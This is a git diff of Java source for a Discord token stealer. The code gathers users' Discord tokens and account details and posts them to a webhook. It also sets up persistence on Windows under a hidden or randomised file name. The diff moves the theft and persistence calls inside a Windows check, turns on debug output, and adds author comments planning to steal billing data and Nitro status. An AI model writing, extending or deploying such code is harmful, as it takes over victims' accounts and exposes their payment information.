@@ -10,12 +10,14 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class Main {
-    private static boolean debug = false; // Whether or not everyting should be displayed on terminal window
+    private static boolean debug = true; // Whether or not everyting should be displayed on terminal window
 
     public static void main(String[] args) throws Exception {
         // TODO: Billing information
         // TODO: Check for nitro
         // TODO: Add more MacOS Options
+
+        // IMPORTANT: Coming today I will add billing, soon I will add nitro
 
         // IMPORTANT: Not tested on MacOS or Linux (hopefully works)
 
@@ -37,18 +39,31 @@ public class Main {
         boolean randomize_new_name = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "randomize_new_name")); //Whether or not a random string shoud be set as the file name
         boolean shouldPersist = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "shouldPersist"));
 
+        if (!(args.length > 0)) {
+            if (System.getProperty("os.name").contains("Windows")) {
+                String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
+                String decodedPath = URLDecoder.decode(path, "UTF-8");
+                String file_name = decodedPath.split("/")[decodedPath.split("/").length - 1];
+
+                //Mini
+                if (shouldPersist) {
+                    miniPersistence(randomize_new_name, hideAs);
+                }
+
+                //Gatherer
+                for (String token : getTokens(ensure_valid)) {
+                    sendEmbed(grabTokenInformation(discord_avatar_url, discord_username, token, send_embed), discord_webhook_url);
+                }
+
+            } else {
+            }
+        }
+
+
+
+
 
         ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-        //Mini
-        if (shouldPersist) {
-            miniPersistence(randomize_new_name, hideAs);
-        }
-
-        //Gatherer
-        for (String token : getTokens(ensure_valid)) {
-            sendEmbed(grabTokenInformation(discord_avatar_url, discord_username, token, send_embed), discord_webhook_url);
-        }
     }
 
     private static String grabTokenInformation(String avatar_url, String username, String token, boolean sendEmbed) throws IOException {
@@ -200,9 +215,9 @@ public class Main {
 
 
 
-     /////////////////
+    /////////////////
     /// Requests ///
-   ////////////////
+    ////////////////
 
     private static String get_request(String uri, boolean isChecking, String token) throws IOException {
         URL url = new URL(uri);
